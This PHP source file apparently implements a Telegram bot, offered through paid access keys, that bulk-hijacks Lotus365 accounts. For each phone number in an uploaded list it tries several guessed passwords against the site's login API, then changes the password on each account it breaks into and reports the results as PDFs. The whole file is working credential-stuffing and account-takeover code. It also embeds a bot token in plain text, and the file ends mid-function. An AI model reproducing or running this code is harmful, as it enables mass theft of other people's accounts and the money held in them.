<?php
/**
 * Lotus365 Bulk Password Updater Bot
 * - Koi pre-filled/default password nahi
 * - Har number par multiple old passwords (5-6+) automatically try karta hai
 * - Login hote hi user ke diye hue new password se change karta hai
 * - Live TOTAL / SUCCESS / FAILED terminal + pagination + cancel
 * - End mein Success PDF aur Rejected PDF generate aur send karta hai
 */

define('BOT_TOKEN', '9007102315:AAFgO1DswluchSHcs7cQlv2u4s-4LNzDAiM');
define('API_BASE', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

define('ADMIN_ID', 8447852036);
define('DATA_DIR', __DIR__ . '/data');

// Apni APIs aur Site URL yahan set karein (jab aap bhejenge tab yahan fill kar sakte hain)
define('SITE_REFER_URL', '');
define('LOGIN_API_URL', '');
define('CHANGE_PASS_API_URL', '');

define('PAGE_SIZE', 8);
define('MAX_NUMBERS_PER_RUN', 2000);
define('PROGRESS_INTERVAL', 1.5);
define('WORKER_SECRET', 'wsec_' . hash('sha256', BOT_TOKEN . '|lotus365_bulk_pass_2026'));

@mkdir(DATA_DIR, 0755, true);
ignore_user_abort(true);
set_time_limit(0);

if (!defined('BOT_LIB_ONLY')) {
    header('Content-Type: application/json');
    echo '{"ok":true}';
    if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();
    else { while (ob_get_level()) ob_end_flush(); flush(); }
}

function isAdmin($uid) {
    return (int)$uid > 0 && (int)$uid === (int)ADMIN_ID;
}

function loadJson($name, $default = []) {
    $p = DATA_DIR . '/' . $name;
    if (!file_exists($p)) return $default;
    $fp = @fopen($p, 'r'); if (!$fp) return $default;
    flock($fp, LOCK_SH); $d = stream_get_contents($fp);
    flock($fp, LOCK_UN); fclose($fp);
    $j = json_decode($d, true); return $j === null ? $default : $j;
}

function saveJson($name, $data) {
    $p = DATA_DIR . '/' . $name;
    $fp = @fopen($p, 'c+'); if (!$fp) return false;
    flock($fp, LOCK_EX); ftruncate($fp, 0); rewind($fp);
    fwrite($fp, json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE));
    fflush($fp); flock($fp, LOCK_UN); fclose($fp); return true;
}

function tg($method, $params = []) {
    static $ch = null; if ($ch === null) $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => API_BASE . $method,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

function ensureSideMenuCommands() {
    $flag_file = DATA_DIR . '/commands_set_l365_v2026.flag';
    if (file_exists($flag_file)) return;
    $commands = [
        ['command' => 'start', 'description' => '🚀 Start Bot'],
        ['command' => 'key', 'description' => '🔑 Enter Access Key'],
    ];
    $res = tg('setMyCommands', ['commands' => $commands]);
    if (!empty($res['ok'])) {
        tg('setChatMenuButton', ['menu_button' => ['type' => 'commands']]);
        @file_put_contents($flag_file, date('Y-m-d H:i:s'));
    }
}

function utf16_len($s) {
    if (function_exists('mb_convert_encoding')) return (int)(strlen(mb_convert_encoding($s, 'UTF-16LE', 'UTF-8')) / 2);
    return strlen($s);
}

function math_font($t) {
    static $m = null;
    if ($m === null) {
        $m = [];
        for ($i = 0; $i < 26; $i++) {
            $m[chr(65 + $i)] = mb_chr(0x1D63C + $i, 'UTF-8');
            $m[chr(97 + $i)] = mb_chr(0x1D656 + $i, 'UTF-8');
        }
    }
    return strtr($t, $m);
}

function build_parts($parts, $bold = true, $uc = true, $bq = true) {
    $text = ''; $ents = []; $off = 0;
    foreach ($parts as $p) {
        $disp = (string)$p[0]; $etype = $p[2] ?? null;
        $isUrl = (bool)preg_match('#https?://#i', trim($disp));
        $isPhoneOnly = (bool)preg_match('#^[6-9]\d{9}$#', trim($disp));
        $skipStyle = $isUrl || $isPhoneOnly || $etype;
        if ($uc && !$skipStyle) $disp = mb_strtoupper($disp, 'UTF-8');
        if (!$skipStyle) $disp = math_font($disp);

        $len = utf16_len($disp);
        if ($etype) $ents[] = ['type' => $etype, 'offset' => $off, 'length' => $len];
        elseif ($bold && $disp !== '') $ents[] = ['type' => 'bold', 'offset' => $off, 'length' => $len];
        $text .= $disp; $off += $len;
    }
    if ($bq && $text !== '') $ents[] = ['type' => 'blockquote', 'offset' => 0, 'length' => utf16_len($text)];
    return [$text, $ents];
}

function send_premium($chat_id, $parts, $kb = null, $bq = true) {
    list($text, $ents) = build_parts($parts, true, true, $bq);
    $p = ['chat_id' => $chat_id, 'text' => $text, 'entities' => $ents, 'disable_web_page_preview' => true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('sendMessage', $p);
}

function edit_premium($chat_id, $mid, $parts, $kb = null) {
    list($text, $ents) = build_parts($parts, true, true, true);
    $p = ['chat_id' => $chat_id, 'message_id' => $mid, 'text' => $text, 'entities' => $ents, 'disable_web_page_preview' => true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('editMessageText', $p);
}

function sendDocumentFile($chat_id, $filePath, $mimeType, $caption = '') {
    $ch = curl_init(API_BASE . 'sendDocument');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'document' => new CURLFile($filePath, $mimeType, basename($filePath)),
            'caption' => $caption,
            'parse_mode' => 'HTML',
        ],
        CURLOPT_TIMEOUT => 60,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

/* ================= KEY SYSTEM ================= */

function parseDurationToSeconds($raw) {
    $s = strtolower(trim((string)$raw));
    if ($s === '' || in_array($s, ['unlimited', 'perm', 'permanent', 'life', 'lifetime', '0', 'inf'])) {
        return ['seconds' => null, 'label' => 'UNLIMITED'];
    }
    if (!preg_match('/^(\d+)\s*(m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days|w|wk|wks|week|weeks)$/i', $s, $m)) {
        return null;
    }
    $val = (int)$m[1];
    if ($val <= 0) return null;
    $unit = strtolower($m[2][0]);
    if ($unit === 'm') return ['seconds' => $val * 60, 'label' => $val . ' MINUTE(S)'];
    if ($unit === 'h') return ['seconds' => $val * 3600, 'label' => $val . ' HOUR(S)'];
    if ($unit === 'd') return ['seconds' => $val * 86400, 'label' => $val . ' DAY(S)'];
    if ($unit === 'w') return ['seconds' => $val * 604800, 'label' => $val . ' WEEK(S)'];
    return null;
}

function formatRemainingTime($expiresAt) {
    if ($expiresAt === null) return 'UNLIMITED';
    $diff = (int)$expiresAt - time();
    if ($diff <= 0) return 'EXPIRED';
    $days = floor($diff / 86400);
    $hours = floor(($diff % 86400) / 3600);
    $mins = floor(($diff % 3600) / 60);
    $secs = $diff % 60;
    $parts = [];
    if ($days > 0) $parts[] = $days . 'd';
    if ($hours > 0) $parts[] = $hours . 'h';
    if ($mins > 0) $parts[] = $mins . 'm';
    if ($days === 0 && $hours === 0) $parts[] = $secs . 's';
    return implode(' ', $parts);
}

function randomSuffixCode($lenDigits = 3, $lenLetters = 2) {
    $digits = '';
    for ($i = 0; $i < $lenDigits; $i++) $digits .= (string)random_int(0, 9);
    $letters = '';
    for ($i = 0; $i < $lenLetters; $i++) $letters .= chr(random_int(65, 90));
    return $digits . $letters;
}

function getKeysDb() { return loadJson('keys.json', []); }
function saveKeysDb($db) { return saveJson('keys.json', $db); }

function createAccessKey($customKey, $durationRaw) {
    $parsed = parseDurationToSeconds($durationRaw);
    if ($parsed === null) return ['ok' => false, 'error' => 'INVALID DURATION (USE: 30m, 2h, 1d, 7d, 30d, OR UNLIMITED)'];

    $db = getKeysDb();
    $rawInput = strtoupper(trim((string)$customKey));

    if ($rawInput === '' || in_array($rawInput, ['AUTO', 'RANDOM', 'GEN', 'NEW'])) {
        $prefix = 'L365';
        $code = '';
        for ($attempt = 0; $attempt < 30; $attempt++) {
            $candidate = $prefix . randomSuffixCode(3, 2);
            if (!isset($db[$candidate])) { $code = $candidate; break; }
        }
        if ($code === '') $code = $prefix . strtoupper(bin2hex(random_bytes(3)));
    } else {
        $cleanPrefix = preg_replace('/[^A-Z0-9_-]/', '', $rawInput);
        if (strlen($cleanPrefix) < 2 || strlen($cleanPrefix) > 35) {
            return ['ok' => false, 'error' => 'KEY LENGTH MUST BE 2-35 CHARS (A-Z, 0-9, _, -)'];
        }
        if (isset($db[$cleanPrefix])) {
            $code = '';
            for ($attempt = 0; $attempt < 30; $attempt++) {
                $candidate = $cleanPrefix . randomSuffixCode(3, 2);
                if (!isset($db[$candidate])) { $code = $candidate; break; }
            }
            if ($code === '') return ['ok' => false, 'error' => 'COULD NOT GENERATE UNIQUE KEY'];
        } else {
            $code = $cleanPrefix;
        }
    }

    $db[$code] = [
        'key' => $code,
        'duration_sec' => $parsed['seconds'],
        'duration_label' => $parsed['label'],
        'created_at' => time(),
        'activated_at' => null,
        'expires_at' => null,
        'assigned_to' => null,
        'active' => true,
    ];
    saveKeysDb($db);
    return ['ok' => true, 'entry' => $db[$code]];
}

function deleteAccessKey($code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) return false;
    unset($db[$code]);
    saveKeysDb($db);
    return true;
}

function redeemAccessKey($uid, $code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) return ['ok' => false, 'msg' => 'INVALID KEY. CHECK AND TRY AGAIN.'];
    $entry = $db[$code];
    if (empty($entry['active'])) return ['ok' => false, 'msg' => 'THIS KEY IS INACTIVE / DELETED.'];

    $now = time();
    if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
        unset($db[$code]); saveKeysDb($db);
        return ['ok' => false, 'msg' => 'THIS KEY HAS EXPIRED.'];
    }
    if ($entry['assigned_to'] !== null && (int)$entry['assigned_to'] !== (int)$uid) {
        return ['ok' => false, 'msg' => 'THIS KEY IS ALREADY USED BY ANOTHER USER.'];
    }
    if ($entry['activated_at'] === null) {
        $entry['activated_at'] = $now;
        $entry['assigned_to'] = (int)$uid;
        $entry['expires_at'] = ($entry['duration_sec'] !== null) ? ($now + (int)$entry['duration_sec']) : null;
        $db[$code] = $entry;
        saveKeysDb($db);
    }
    return ['ok' => true, 'entry' => $entry];
}

function getUserActiveKey($uid) {
    if (isAdmin($uid)) {
        return ['key' => 'ADMIN-ACCESS', 'duration_label' => 'UNLIMITED', 'expires_at' => null, 'remaining' => 'UNLIMITED'];
    }
    $db = getKeysDb();
    $now = time();
    $changed = false;
    $activeKey = null;
    foreach ($db as $code => $entry) {
        if ((int)($entry['assigned_to'] ?? 0) === (int)$uid) {
            if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
                unset($db[$code]); $changed = true;
            } elseif (!empty($entry['active'])) {
                $activeKey = $entry;
                $activeKey['remaining'] = formatRemainingTime($entry['expires_at']);
            }
        }
    }
    if ($changed) saveKeysDb($db);
    return $activeKey;
}

function hasValidKey($uid) {
    if (isAdmin($uid)) return true;
    return getUserActiveKey($uid) !== null;
}

/* ================= KEYBOARDS & STATE ================= */

function mainMenuKeyboard($uid = 0) {
    $rows = [
        [['text' => math_font('AUTO MODE'), 'style' => 'success']],
        [['text' => math_font('ENTER KEY'), 'style' => 'primary'], ['text' => math_font('CANCEL'), 'style' => 'danger']],
    ];
    if (isAdmin($uid)) {
        $rows[] = [
            ['text' => math_font('GEN KEY'), 'style' => 'success'],
            ['text' => math_font('LIST KEYS'), 'style' => 'primary'],
            ['text' => math_font('DEL KEY'), 'style' => 'danger'],
        ];
    }
    return ['keyboard' => $rows, 'resize_keyboard' => true];
}

function cancelKeyboard() {
    return ['keyboard' => [[['text' => math_font('CANCEL'), 'style' => 'danger']]], 'resize_keyboard' => true];
}

function getUsers() { return loadJson('users.json', []); }
function saveUsers($u) { return saveJson('users.json', $u); }
function getStates() { return loadJson('states.json', []); }
function saveStates($s) { return saveJson('states.json', $s); }
function getState($uid) { $s = getStates(); return $s[$uid] ?? null; }
function setState($uid, $s) { $a = getStates(); $a[$uid] = $s; saveStates($a); }
function clearState($uid) { $a = getStates(); unset($a[$uid]); saveStates($a); }

function ensureUser($uid, $name = '', $username = '') {
    $u = getUsers();
    if (!isset($u[$uid])) {
        $u[$uid] = ['id' => $uid, 'name' => $name, 'username' => $username, 'joined_at' => date('Y-m-d H:i:s')];
        saveUsers($u);
    }
}

/* ================= NUMBER & PDF EXTRACTION ================= */

function extractPhoneNumbersFromText($text) {
    $phones = [];
    if (preg_match_all('/(?:\+91|91|0)?([6-9]\d{9})/', (string)$text, $m)) {
        foreach ($m[1] as $p) {
            if (!in_array($p, $phones, true)) $phones[] = $p;
        }
    }
    return $phones;
}

function extractPhoneNumbersFromFile($fileId) {
    $info = tg('getFile', ['file_id' => $fileId]);
    $filePath = $info['result']['file_path'] ?? '';
    if ($filePath === '') return [];

    $dlUrl = 'https://api.telegram.org/file/bot' . BOT_TOKEN . '/' . ltrim($filePath, '/');
    $tmpBase = DATA_DIR . '/inp_' . uniqid('', true);
    $rawFile = $tmpBase . '_' . basename($filePath);

    $ch = curl_init($dlUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $bin = curl_exec($ch);
    curl_close($ch);
    if (!$bin) return [];

    file_put_contents($rawFile, $bin);
    $textContent = '';

    if (preg_match('/\.pdf$/i', $rawFile)) {
        $txtOut = $tmpBase . '.txt';
        @exec('pdftotext ' . escapeshellarg($rawFile) . ' ' . escapeshellarg($txtOut) . ' 2>/dev/null');
        if (file_exists($txtOut)) {
            $textContent = (string)file_get_contents($txtOut);
            @unlink($txtOut);
        } else {
            $textContent = (string)$bin;
        }
    } else {
        $textContent = (string)$bin;
    }

    @unlink($rawFile);
    return extractPhoneNumbersFromText($textContent);
}

/* ================= LOGIN & PASSWORD CHANGE APIs ================= */

function callLoginEndpoint($phone, $oldPassword) {
    if (LOGIN_API_URL === '') return ['ok' => false, 'token' => ''];

    $ch = curl_init(LOGIN_API_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'mobile' => $phone,
            'username' => $phone,
            'password' => $oldPassword,
            'countrycode' => '91',
        ]),
        CURLOPT_HTTPHEADER => array_filter([
            'Content-Type: application/json',
            'Accept: application/json, text/plain, */*',
            SITE_REFER_URL !== '' ? 'Origin: ' . SITE_REFER_URL : '',
            SITE_REFER_URL !== '' ? 'Referer: ' . SITE_REFER_URL . '/' : '',
        ]),
        CURLOPT_TIMEOUT => 12,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $raw = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $json = json_decode((string)$raw, true);
    $token = $json['token']
        ?? $json['access_token']
        ?? $json['data']['token']
        ?? $json['data']['access_token']
        ?? '';

    $ok = ($code >= 200 && $code < 300) && (
        !empty($token)
        || !empty($json['success'])
        || !empty($json['status'])
    );

    return ['ok' => $ok, 'token' => (string)$token];
}

function callChangePasswordEndpoint($phone, $oldPassword, $newPassword, $token = '') {
    if (CHANGE_PASS_API_URL === '') return ['ok' => false, 'reason' => 'API NOT SET'];

    $headers = array_filter([
        'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        SITE_REFER_URL !== '' ? 'Origin: ' . SITE_REFER_URL : '',
        SITE_REFER_URL !== '' ? 'Referer: ' . SITE_REFER_URL . '/' : '',
        $token !== '' ? 'Authorization: Bearer ' . $token : '',
    ]);

    $ch = curl_init(CHANGE_PASS_API_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'mobile' => $phone,
            'current_password' => $oldPassword,
            'old_password' => $oldPassword,
            'new_password' => $newPassword,
            'confirm_password' => $newPassword,
            'confirm_new_password' => $newPassword,
        ]),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 12,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $raw = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $json = json_decode((string)$raw, true);
    $msg = strtolower((string)($json['message'] ?? $raw ?? ''));

    $ok = ($code >= 200 && $code < 300) && (
        !empty($json['success'])
        || strpos($msg, 'changed successfully') !== false
        || strpos($msg, 'password updated') !== false
    );

    return ['ok' => $ok, 'reason' => $ok ? 'PASSWORD CHANGED' : 'CHANGE REJECTED'];
}

/* ================= PDF REPORT GENERATOR ================= */

function pdfEscapeText($s) {
    $clean = preg_replace('/[^\x20-\x7E]/', '', (string)$s);
    return str_replace(['\\', '(', ')'], ['\\\\', '\\(', '\\)'], $clean);
}

function buildPdfFile($filePath, $title, $newPassword, $rows) {
    $linesPerPage = 42;
    $chunks = array_chunk($rows, $linesPerPage);
    if (empty($chunks)) $chunks = [[]];

    $numPages = count($chunks);
    $objects = [];
    $pageObjIds = [];

    $catalogId = 1;
    $pagesId = 2;
    $fontId = 3;
    $nextId = 4;

    foreach ($chunks as $pIdx => $pageLines) {
        $pageId = $nextId++;
        $contentId = $nextId++;
        $pageObjIds[] = $pageId;

        $stream = "BT\n/F1 11 Tf\n45 760 Td\n";
        $stream .= "(" . pdfEscapeText($title . " (Page " . ($pIdx + 1) . "/" . $numPages . ")") . ") Tj\n";
        $stream .= "0 -18 Td\n(" . pdfEscapeText("New Password: " . $newPassword . " | Count: " . count($rows)) . ") Tj\n";
        $stream .= "0 -22 Td\n";

        if (empty($pageLines)) {
            $stream .= "(No records.) Tj\n";
        } else {
            foreach ($pageLines as $idx => $lineText) {
                $stream .= "(" . pdfEscapeText(($idx + 1) . ". " . $lineText) . ") Tj\n0 -16 Td\n";
            }
        }
        $stream .= "ET\n";

        $objects[$contentId] = "<< /Length " . strlen($stream) . " >>\nstream\n" . $stream . "endstream";
        $objects[$pageId] = "<< /Type /Page /Parent {$pagesId} 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 {$fontId} 0 R >> >> /Contents {$contentId} 0 R >>";
    }

    $objects[$fontId] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>";
    $kidsStr = implode(' ', array_map(fn($id) => "{$id} 0 R", $pageObjIds));
    $objects[$pagesId] = "<< /Type /Pages /Kids [{$kidsStr}] /Count {$numPages} >>";
    $objects[$catalogId] = "<< /Type /Catalog /Pages {$pagesId} 0 R >>";

    ksort($objects);
    $pdf = "%PDF-1.4\n";
    $offsets = [0];

    foreach ($objects as $objId => $body) {
        $offsets[$objId] = strlen($pdf);
        $pdf .= "{$objId} 0 obj\n{$body}\nendobj\n";
    }

    $xrefPos = strlen($pdf);
    $totalObjs = count($objects) + 1;
    $pdf .= "xref\n0 {$totalObjs}\n0000000000 65535 f \n";
    for ($i = 1; $i < $totalObjs; $i++) {
        $pdf .= sprintf("%010d 00000 n \n", $offsets[$i] ?? 0);
    }
    $pdf .= "trailer\n<< /Size {$totalObjs} /Root {$catalogId} 0 R >>\nstartxref\n{$xrefPos}\n%%EOF";

    file_put_contents($filePath, $pdf);
}

/* ================= LIVE TERMINAL ================= */

function computePages($total) {
    $pages = [];
    for ($i = 0; $i < $total; $i += PAGE_SIZE) {
        $pages[] = [$i, min($i + PAGE_SIZE, $total)];
    }
    return empty($pages) ? [[0, 0]] : $pages;
}

function getTerminalState($uid) { return loadJson('terminal_' . $uid . '.json', null); }
function setTerminalState($uid, $s) { saveJson('terminal_' . $uid . '.json', $s); }

function terminalParts($state, $pageIdx, $final = false) {
    $parts = [];
    $items = $state['items'] ?? [];
    $total = (int)($state['total'] ?? 0);
    $done = (int)($state['done'] ?? 0);
    $success = (int)($state['success'] ?? 0);
    $failed = (int)($state['failed'] ?? 0);
    $cancelled = !empty($state['cancelled']);

    $pages = computePages($total);
    $totalPages = count($pages);
    $pageIdx = max(0, min($totalPages - 1, $pageIdx));
    [$start, $end] = $pages[$pageIdx];
    $pNum = $pageIdx + 1;

    $elapsed = max(0, time() - (int)($state['started_at'] ?? time()));
    $timerStr = sprintf('%02d:%02d', floor($elapsed / 60), $elapsed % 60);

    $parts[] = ['🤖', null];
    $parts[] = [" LOTUS365 PASS UPDATER [⏱ $timerStr] — PAGE $pNum/$totalPages\n", null];
    $parts[] = ["━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📊', null]; $parts[] = [" TOTAL: $total | ", null];
    $parts[] = ['✅', null]; $parts[] = [" SUCCESS: $success | ", null];
    $parts[] = ['❌', null]; $parts[] = [" FAILED: $failed\n\n", null];

    for ($i = $start; $i < $end; $i++) {
        $it = $items[$i] ?? null;
        if (!$it) continue;
        $phone = $it['phone'] ?? 'N/A';
        $st = $it['status'] ?? 'pending';
        $parts[] = ['⭐', null];
        $parts[] = [" $phone ", null];

        if ($st === 'success') {
            $parts[] = ['✅', null];
            $parts[] = [" SUCCESS (" . ($it['matched_old'] ?? 'OLD') . ")\n", null];
        } elseif ($st === 'trying') {
            $parts[] = [" 🔄 TRYING PASSWORDS...\n", null];
        } elseif ($st === 'failed') {
            $parts[] = ['❌', null];
            $parts[] = [" " . ($it['reason'] ?? 'FAILED') . "\n", null];
        } else {
            $parts[] = [" ⏳ PENDING\n", null];
        }
    }

    $parts[] = ["\n━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📈', null]; $parts[] = [" PROGRESS: $done/$total\n", null];
    $parts[] = ['🏁', null]; $parts[] = [$cancelled ? " CANCELLED\n" : ($final ? " COMPLETE\n" : " RUNNING...\n"), null];
    return $parts;
}

function terminalKeyboard($pageIdx, $totalPages, $final = false) {
    $rows = [];
    if ($totalPages > 1) {
        $nav = [];
        if ($pageIdx > 0) $nav[] = ['text' => math_font('PREV'), 'callback_data' => 'term_page:' . ($pageIdx - 1), 'style' => 'primary'];
        if ($pageIdx < $totalPages - 1) $nav[] = ['text' => math_font('NEXT'), 'callback_data' => 'term_page:' . ($pageIdx + 1), 'style' => 'primary'];
        if ($nav) $rows[] = $nav;
    }
    if (!$final) $rows[] = [['text' => math_font('CANCEL'), 'callback_data' => 'term_cancel', 'style' => 'danger']];
    return $rows ? ['inline_keyboard' => $rows] : null;
}

function renderTerminal($uid, $final = false, $force = false) {
    static $last = 0.0;
    if (!$final && !$force && (microtime(true) - $last) < PROGRESS_INTERVAL) return;
    $last = microtime(true);
    $s = getTerminalState($uid);
    if (!$s || empty($s['msg_id'])) return;
    $pg = max(0, min(count(computePages($s['total'] ?? 0)) - 1, (int)($s['current_page'] ?? 0)));
    $isEnd = $final || !empty($s['completed']) || !empty($s['cancelled']);
    edit_premium($s['chat_id'], $s['msg_id'], terminalParts($s, $pg, $isEnd), terminalKeyboard($pg, count(computePages($s['total'] ?? 0)), $isEnd));
}

function spawnPassWorker($uid, $chat_id, $phones, $oldPasswords, $newPassword) {
    $payload = json_encode([
        'uid' => (int)$uid,
        'chat_id' => (int)$chat_id,
        'phones' => array_values($phones),
        'old_passwords' => array_values($oldPasswords),
        'new_password' => (string)$newPassword,
        'ts' => time(),
    ], JSON_UNESCAPED_SLASHES);
    $token = hash_hmac('sha256', $payload, WORKER_SECRET);
    $worker = __DIR__ . '/worker.php';
    $dis = array_map('trim', explode(',', (string)ini_get('disable_functions')));

    if (function_exists('exec') && !in_array('exec', $dis)) {
        @exec('nohup php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &');
        return true;
    }
    if (function_exists('popen') && !in_array('popen', $dis)) {
        $h = @popen('php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &', 'r');
        if ($h) { @pclose($h); return true; }
    }
    return false;
}

function runPasswordBatchFlow($uid, $chat_id, $phones, $oldPasswords, $newPassword) {
    $items = [];
    foreach ($phones as $ph) {
        $items[] = [
            'phone' => $ph,
            'status' => 'pending',
            'matched_old' => '',
            'reason' => '',
        ];
    }

    $total = count($items);
    $totalPages = count(computePages($total));

    $state = [
        'chat_id' => $chat_id,
        'uid' => $uid,
        'total' => $total,
        'current_page' => 0,
        'done' => 0,
        'success' => 0,
        'failed' => 0,
        'items' => $items,
        'msg_id' => null,
        'cancelled' => false,
        'completed' => false,
        'started_at' => time(),
    ];

    $res = send_premium($chat_id, terminalParts($state, 0, false), terminalKeyboard(0, $totalPages, false));
    if (!empty($res['ok'])) $state['msg_id'] = $res['result']['message_id'];
    setTerminalState($uid, $state);

    $successRows = [];
    $rejectedRows = [];

    for ($i = 0; $i < $total; $i++) {
        $curState = getTerminalState($uid);
        if (!empty($curState['cancelled'])) {
            $state = $curState;
            break;
        }

        $phone = $state['items'][$i]['phone'];
        $state['items'][$i]['status'] = 'trying';
        $state['current_page'] = (int)floor($i / PAGE_SIZE);
        setTerminalState($uid, $state);
        renderTerminal($uid, false, true);

        $changedDone = false;
        $matchedOld = '';
        $failReason = 'NO PASS MATCHED';

        foreach ($oldPasswords as $oldPass) {
            $login = callLoginEndpoint($phone, $oldPass);
            if (!empty($login['ok'])) {
                $matchedOld = $oldPass;
                $chg = callChangePasswordEndpoint($phone, $oldPass, $newPassword, $login['token'] ?? '');
                if (!empty($chg['ok'])) {
                    $changedDone = true;
                } else {
                    $failReason = $chg['reason'] ?? 'CHANGE REJECTED';
                }
                break;
            }
        }

        if ($changedDone) {
            $state['items'][$i]['status'] = 'success';
            $state['items'][$i]['matched_old'] = $matchedOld;
            $state['success']++;
            $successRows[] = "{$phone} | Old: {$matchedOld} -> New: {$newPassword}";
        } else {
            $state['items'][$i]['status'] = 'failed';
            $state['items'][$i]['reason'] = $failReason;
            $state['failed']++;
            $rejectedRows[] = "{$phone} | {$failReason}";
        }

        $state['done']++;
        setTerminalState($uid, $state);
        renderTerminal($uid, false, false);
    }

    $state['completed'] = true;
    setTerminalState($uid, $state);
    renderTerminal($uid, true, true);

    $ts = time();
    $successPdf = DATA_DIR . "/success_passwords_{$uid}_{$ts}.pdf";
    $rejectedPdf = DATA_DIR . "/rejected_numbers_{$uid}_{$ts}.pdf";

    buildPdfFile($successPdf, "LOTUS365 SUCCESS PASSWORD CHANGED", $newPassword, $successRows);
    buildPdfFile($rejectedPdf, "LOTUS365 REJECTED NUMBERS", $newPassword, $rejectedRows);

    sendDocumentFile(
        $chat_id,
        $successPdf,
        'application/pdf',
        "✅ <b>Success PDF</b> (" . count($successRows) . ")\nNew Password: <code>" . htmlspecialchars($newPassword, ENT_QUOTES, 'UTF-8') . "</code>"
    );

    sendDocumentFile(
        $chat_id,
        $rejectedPdf,
        'application/pdf',
        "❌ <b>Rejected PDF</b> (" . count($rejectedRows) . ")"
    );

    @unlink($successPdf);
    @unlink($rejectedPdf);

    send_premium($chat_id, [
        ['⭐', null], [" BATCH COMPLETE\n", null],
        ["━━━━━━━━━━━━━━━━━━\n", null],
        ['📊', null], [" TOTAL: " . $state['total'] . "\n", null],
        ['✅', null], [" SUCCESS: " . $state['success'] . "\n", null],
        ['❌', null], [" FAILED: " . $state['failed'] . "\n", null],
    ], mainMenuKeyboard($uid));
}

if (!defined('BOT_LIB_ONLY')) {
    ensureSideMenuCommands();
    $input = file_get_contents('php://input');
    $update = json_decode($input, true);
    if (!$update) exit;
    try {
        if (isset($update['callback_query'])) handleCallback($update['callback_query']);
        elseif (isset($update['message'])) handleMessage($update['message']);
    } catch (Throwable $e) { error_log('Bot err: ' . $e->getMessage()); }
}

function handleCallback($cb) {
    $uid = $cb['from']['id'];
    $data = $cb['data'] ?? '';
    $cb_id = $cb['id'];
    $chat_id = $cb['message']['chat']['id'];

    if (strpos($data, 'term_page:') === 0) {
        $target = (int)substr($data, 10);
        $s = getTerminalState($uid);
        if ($s) {
            $totalPages = count(computePages($s['total'] ?? 0));
            $target = max(0, min($totalPages - 1, $target));
            $s['current_page'] = $target;
            setTerminalState($uid, $s);
            $isEnd = !empty($s['completed']) || !empty($s['cancelled']);
            edit_premium($chat_id, $cb['message']['message_id'], terminalParts($s, $target, $isEnd), terminalKeyboard($target, $totalPages, $isEnd));
        }
        tg('answerCallbackQuery', ['callback_query_id' => $cb_id, 'text' => '📄 Page ' . ($target + 1), 'show_alert' => false]);
        return;
    }

    if ($data === 'term_cancel') {
        tg('answerCallbackQuery', ['callback_query_id' => $cb_id, 'text' => '🛑 Stopping...', 'show_alert' => false]);
        $s = getTerminalState($uid);
        if ($s) {
            $s['cancelled'] = true;
            $s['completed'] = true;
            setTerminalState($uid, $s);
            renderTerminal($uid, true, true);
        }
        clearState($uid);
        send_premium($chat_id, [['❌', null], [' CANCELLED', null]], mainMenuKeyboard($uid));
        return;
    }

    tg('answerCallbackQuery', ['callback_query_id' => $cb_id]);
}

function handleMessage($msg) {
    $uid = $msg['from']['id'];
    $name = trim(($msg['from']['first_name'] ?? '') . ' ' . ($msg['from']['last_name'] ?? '')) ?: 'User';
    $username = $msg['from']['username'] ?? '';
    $chat_id = $msg['chat']['id'];
    $text = trim($msg['text'] ?? '');

    ensureUser($uid, $name, $username);

    if ($text === '/cancel' || mb_strtoupper($text, 'UTF-8') === 'CANCEL' || $text === math_font('CANCEL')) {
        $s = getTerminalState($uid);
        if ($s && empty($s['completed'])) {
            $s['cancelled'] = true;
            $s['completed'] = true;
            setTerminalState($uid, $s);
            renderTerminal($uid, true, true);
        }
        clearState($uid);
